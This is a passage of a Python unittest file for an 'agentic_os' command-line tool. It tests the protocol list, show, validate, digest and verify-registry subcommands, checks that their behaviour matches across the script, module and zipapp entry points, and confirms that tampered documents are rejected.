                    with mock.patch("sys.stdout"):
                        self.assertEqual(cli.main(argv), 0)
        self.assertEqual(db_path.read_bytes(), before, "the ledger was mutated")

    def test_protocol_commands_emit_no_ledger_event(self):
        workspace = self.tmp / "wse"
        workspace.mkdir()
        _run([sys.executable, str(REPO_ROOT / "aos.py"), "init"], workspace)
        db_path = workspace / ".agentic-os" / "aos.db"

        def count():
            conn = sqlite3.connect(db_path)
            try:
                return conn.execute("SELECT count(*) FROM events").fetchone()[0]
            finally:
                conn.close()

        before = count()
        for argv in self._invocations():
            result = _run([sys.executable, str(REPO_ROOT / "aos.py"), *argv], workspace)
            self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(count(), before)

    def test_protocol_commands_create_no_workspace_state_or_power_json(self):
        for argv in self._invocations():
            with self.subTest(argv=argv):
                scratch = Path(tempfile.mkdtemp(dir=self.tmp))
                artifact = scratch / "ws.json"
                artifact.write_bytes(to_bytes(work_spec()))
                argv = [a.replace(str(self.artifact), str(artifact)) for a in argv]
                before = sorted(p.name for p in scratch.iterdir())

                result = _run([sys.executable, str(REPO_ROOT / "aos.py"), *argv], scratch)
                self.assertEqual(result.returncode, 0, result.stderr)

                self.assertEqual(sorted(p.name for p in scratch.iterdir()), before)
                self.assertFalse((scratch / ".agentic-os").exists())
                self.assertFalse((scratch / "power.json").exists())

    def test_protocol_commands_do_not_create_power_json_in_a_real_workspace(self):
        workspace = self.tmp / "wsp"
        workspace.mkdir()
        _run([sys.executable, str(REPO_ROOT / "aos.py"), "init"], workspace)
        aos_dir = workspace / ".agentic-os"
        self.assertFalse((aos_dir / "power.json").exists())
        for argv in self._invocations():
            result = _run([sys.executable, str(REPO_ROOT / "aos.py"), *argv], workspace)
            self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse((aos_dir / "power.json").exists())

    def test_protocol_commands_need_no_initialized_workspace(self):
        for argv in self._invocations():
            with self.subTest(argv=argv):
                result = _run(
                    [sys.executable, str(REPO_ROOT / "aos.py"), *argv], self.tmp
                )
                self.assertEqual(result.returncode, 0, result.stderr)


import contextlib  # noqa: E402


@contextlib.contextmanager
def contextlib_chdir(path):
    previous = os.getcwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(previous)


# ---------------------------------------------------------------------------
# CLI behavior


class CliTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="aos-x1-cli-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)

    def _aos(self, *argv, cwd=None):
        return _run(
            [sys.executable, str(REPO_ROOT / "aos.py"), *argv], cwd or self.tmp
        )

    def test_list_prints_stable_ordered_names_versions_and_digests(self):
        first = self._aos("protocol", "list")
        second = self._aos("protocol", "list")
        self.assertEqual(first.returncode, 0, first.stderr)
        self.assertEqual(first.stdout, second.stdout)
        lines = first.stdout.strip().splitlines()
        self.assertEqual(len(lines), 6)
        for line, entry in zip(lines, protocols.list_entries()):
            self.assertIn(entry.name, line)
            self.assertIn(f"v{entry.major}", line)
            self.assertIn(entry.digest, line)
            self.assertIn(entry.status, line)

    def test_list_json_is_deterministic(self):
        result = self._aos("protocol", "list", "--json")
        self.assertEqual(result.returncode, 0, result.stderr)
        rows = json.loads(result.stdout)
        self.assertEqual(
            rows,
            [
                {
                    "schema": e.identity,
                    "name": e.name,
                    "major": e.major,
                    "status": e.status,
                    "sha256": e.digest,
                }
                for e in protocols.list_entries()
            ],
        )

    def test_show_prints_the_exact_checked_in_representation(self):
        for entry in protocols.list_entries():
            with self.subTest(identity=entry.identity):
                result = self._aos("protocol", "show", entry.identity)
                self.assertEqual(result.returncode, 0, result.stderr)
                on_disk = (ARTIFACT_ROOT / entry.artifact_relpath).read_bytes()
                self.assertEqual(result.stdout.encode("utf-8"), on_disk)

    def test_show_output_is_deterministic_and_parses_back(self):
        first = self._aos("protocol", "show", "beast.work-spec/v1")
        second = self._aos("protocol", "show", "beast.work-spec/v1")
        self.assertEqual(first.stdout, second.stdout)
        self.assertEqual(
            json.loads(first.stdout),
            protocols.REGISTRY["beast.work-spec/v1"].schema,
        )

    def test_show_refuses_a_bare_name_and_an_unknown_schema(self):
        for argument in ("beast.work-spec", "nope.thing/v1", "beast.work-spec/v9"):
            with self.subTest(argument=argument):
                result = self._aos("protocol", "show", argument)
                self.assertEqual(result.returncode, 1)
                self.assertEqual(result.stdout, "")
                self.assertTrue(result.stderr.strip())

    def test_validate_success_prints_only_the_identity_and_digest(self):
        document = work_spec()
        path = self.tmp / "ws.json"
        path.write_bytes(to_bytes(document))
        result = self._aos("protocol", "validate", str(path))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            result.stdout.strip(),
            f"beast.work-spec/v1 {document[protocols.CONTENT_HASH_FIELD]}",
        )
        self.assertEqual(result.stderr, "")

    def test_validate_failure_keeps_stdout_empty(self):
        path = self.tmp / "bad.json"
        path.write_bytes(to_bytes(dict(work_spec(), goal="tampered")))
        result = self._aos("protocol", "validate", str(path))
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stdout, "")
        self.assertIn("hash_mismatch", result.stderr)

    def test_digest_prints_the_canonical_digest_and_does_not_rewrite_the_source(self):
        document = work_spec()
        path = self.tmp / "ws.json"
        path.write_bytes(to_bytes(document))
        before = path.read_bytes()
        before_mtime = os.lstat(path).st_mtime_ns

        result = self._aos("protocol", "digest", str(path))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            result.stdout.strip(), document[protocols.CONTENT_HASH_FIELD]
        )
        self.assertEqual(path.read_bytes(), before)
        self.assertEqual(os.lstat(path).st_mtime_ns, before_mtime)
        self.assertEqual(sorted(p.name for p in self.tmp.iterdir()), ["ws.json"])

    def test_digest_works_on_a_document_whose_hash_is_absent_or_wrong(self):
        """digest reports what the body hashes to; it is not validate."""
        body = {k: v for k, v in work_spec().items()
                if k != protocols.CONTENT_HASH_FIELD}
        path = self.tmp / "unsealed.json"
        path.write_bytes(json.dumps(body).encode())
        result = self._aos("protocol", "digest", str(path))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.strip(), protocols.content_digest(body))

    def test_digest_still_enforces_bounded_json(self):
        path = self.tmp / "float.json"
        path.write_bytes(b'{"a":1.5}')
        result = self._aos("protocol", "digest", str(path))
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stdout, "")
        self.assertIn("float_not_permitted", result.stderr)

    def test_verify_registry_passes_from_a_source_checkout(self):
        result = self._aos("protocol", "verify-registry", cwd=REPO_ROOT)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("match the embedded definitions byte-for-byte", result.stdout)
        for entry in protocols.list_entries():
            self.assertIn(entry.digest, result.stdout)

    def test_unsafe_input_exits_one_with_an_empty_stdout(self):
        directory = self.tmp / "adir"
        directory.mkdir()
        for leaf in ("validate", "digest"):
            with self.subTest(leaf=leaf):
                result = self._aos("protocol", leaf, str(directory))
                self.assertEqual(result.returncode, 1)
                self.assertEqual(result.stdout, "")
                self.assertIn("unsafe_input", result.stderr)

    def test_a_missing_subcommand_is_a_domain_error(self):
        result = self._aos("protocol")
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stdout, "")


# ---------------------------------------------------------------------------
# (28)(29) Script / module / zipapp parity


class ParityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        builder = _load_builder()
        cls.tmp = Path(tempfile.mkdtemp(prefix="aos-x1-pyz-"))
        cls.addClassCleanup(shutil.rmtree, cls.tmp, ignore_errors=True)
        built = builder.build(cls.tmp / "build" / "aos.pyz")
        # Only the archive travels: nothing else from the checkout.
        cls.standalone = cls.tmp / "elsewhere" / "aos.pyz"
        cls.standalone.parent.mkdir(parents=True)
        shutil.copyfile(built, cls.standalone)
        cls.standalone.chmod(0o755)

        cls.workdir = cls.tmp / "work"
        cls.workdir.mkdir()
        cls.document = work_spec()
        cls.artifact = cls.workdir / "ws.json"
        cls.artifact.write_bytes(to_bytes(cls.document))
        cls.tampered = cls.workdir / "tampered.json"
        cls.tampered.write_bytes(to_bytes(dict(work_spec(), goal="tampered")))

    def _script(self, argv):
        return _run([sys.executable, str(REPO_ROOT / "aos.py"), *argv], self.workdir)

    def _module(self, argv):
        return _run(
            [sys.executable, "-m", "agentic_os", *argv],
            self.workdir,
            _clean_env(PYTHONPATH=str(REPO_ROOT)),
        )

    def _pyz(self, argv, cwd=None):
        return _run([sys.executable, str(self.standalone), *argv], cwd or self.workdir)

    def _all_three(self, argv):
        return self._script(argv), self._module(argv), self._pyz(argv)

    def test_the_archive_carries_the_protocol_module_via_the_existing_allowlist(self):
        import zipfile

        with zipfile.ZipFile(self.standalone) as archive:
            members = set(archive.namelist())
        self.assertIn("agentic_os/protocols.py", members)
        # The projection is NOT in the archive, and does not need to be.
        self.assertFalse([m for m in members if m.startswith("protocols/")])
        self.assertNotIn("protocols/registry.json", members)

    def test_no_checked_in_json_artifact_entered_the_archive(self):
        """No PROTOCOL registry JSON enters the archive (D-v0.3.2/D-v0.3.61
        still hold: protocols/registry.json is never archived). U-A2
        (D-v0.4.14) is the one deliberate exception: the built-in catalog's
        manifest + twelve passports are checked-in JSON that DOES belong in
        the archive, manifest-driven and independently re-verified by the
        builder — never a broad *.json sweep."""
        import zipfile

        with zipfile.ZipFile(self.standalone) as archive:
            names = archive.namelist()
        json_members = [n for n in names if n.endswith(".json")]
        self.assertTrue(
            all(n.startswith("agentic_os/catalog/") for n in json_members), json_members
        )
        self.assertFalse([n for n in json_members if n.startswith("protocols/")])

    def test_list_matches_across_all_three_entrypoints(self):
        results = self._all_three(["protocol", "list"])
        for result in results:
            self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual({r.stdout for r in results}, {results[0].stdout})
        self.assertIn("beast.work-spec", results[0].stdout)

    def test_show_matches_across_all_three_entrypoints(self):
        results = self._all_three(["protocol", "show", "beast.result-envelope/v1"])
        for result in results:
            self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual({r.stdout for r in results}, {results[0].stdout})

    def test_digest_matches_across_all_three_entrypoints(self):
        results = self._all_three(["protocol", "digest", str(self.artifact)])
        for result in results:
            self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            {r.stdout.strip() for r in results},
            {self.document[protocols.CONTENT_HASH_FIELD]},
        )

    def test_validate_matches_across_all_three_entrypoints(self):
        results = self._all_three(["protocol", "validate", str(self.artifact)])
        for result in results:
            self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual({r.stdout for r in results}, {results[0].stdout})

    def test_a_tampered_artifact_is_rejected_identically_by_all_three(self):
        results = self._all_three(["protocol", "validate", str(self.tampered)])
        for result in results:
            self.assertEqual(result.returncode, 1)
            self.assertEqual(result.stdout, "")
            self.assertIn("hash_mismatch", result.stderr)
        self.assertEqual({r.stderr for r in results}, {results[0].stderr})

    def test_exit_codes_match_across_all_three_entrypoints(self):
        for argv in (
            ["protocol", "list"],
            ["protocol", "show", "beast.work-spec/v1"],
            ["protocol", "show", "nope.thing/v1"],
            ["protocol", "validate", str(self.artifact)],
            ["protocol", "validate", str(self.tampered)],
            ["protocol", "validate", str(self.workdir / "missing.json")],
            ["protocol", "digest", str(self.artifact)],
        ):
            with self.subTest(argv=argv):
                codes = {r.returncode for r in self._all_three(argv)}
                self.assertEqual(len(codes), 1, f"exit codes diverged: {codes}")

    def test_the_zipapp_works_outside_the_checkout_with_pythonpath_cleared(self):
        with tempfile.TemporaryDirectory() as elsewhere:
            elsewhere = Path(elsewhere)
            artifact = elsewhere / "ws.json"
            artifact.write_bytes(to_bytes(self.document))

            probe = _run([sys.executable, "-c", "import agentic_os"], elsewhere)
            self.assertNotEqual(
                probe.returncode, 0, "the checkout leaked onto sys.path; test is void"
            )

            listing = self._pyz(["protocol", "list"], elsewhere)
            self.assertEqual(listing.returncode, 0, listing.stderr)
            self.assertIn("beast.work-spec", listing.stdout)

            show = self._pyz(["protocol", "show", "beast.work-spec/v1"], elsewhere)
            self.assertEqual(show.returncode, 0, show.stderr)
            self.assertEqual(
                show.stdout.encode(),
                (ARTIFACT_ROOT / "beast.work-spec/v1.schema.json").read_bytes(),
            )

            valid = self._pyz(["protocol", "validate", str(artifact)], elsewhere)
            self.assertEqual(valid.returncode, 0, valid.stderr)

            digest = self._pyz(["protocol", "digest", str(artifact)], elsewhere)
            self.assertEqual(
                digest.stdout.strip(), self.document[protocols.CONTENT_HASH_FIELD]
            )

            artifact.write_bytes(to_bytes(dict(work_spec(), goal="tampered")))
            bad = self._pyz(["protocol", "validate", str(artifact)], elsewhere)
            self.assertEqual(bad.returncode, 1)
            self.assertEqual(bad.stdout, "")

            self.assertFalse((elsewhere / ".agentic-os").exists())

    def test_verify_registry_from_the_zipapp_reports_comparison_unavailable(self):
        """A zipapp legitimately has no protocols/ directory; that must not be
        a failure, or people learn to ignore this command."""
        with tempfile.TemporaryDirectory() as elsewhere:
            result = self._pyz(["protocol", "verify-registry"], elsewhere)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertIn("comparison unavailable", result.stdout)
            self.assertIn("no source checkout", result.stdout)
            for entry in protocols.list_entries():
                self.assertIn(entry.digest, result.stdout)

    def test_source_artifacts_dir_resolves_only_from_a_real_checkout(self):
        """From the checkout it finds protocols/; from the archive it must
        find nothing — aos.pyz/protocols is inside a FILE, not a directory."""
        self.assertEqual(protocols.source_artifacts_dir(), ARTIFACT_ROOT)
        with tempfile.TemporaryDirectory() as elsewhere:
            probe = self._pyz(["protocol", "verify-registry"], elsewhere)
            self.assertEqual(probe.returncode, 0, probe.stderr)
            self.assertIn("comparison unavailable", probe.stdout)
            self.assertNotIn("match the embedded definitions", probe.stdout)


if __name__ == "__main__":
    unittest.main()
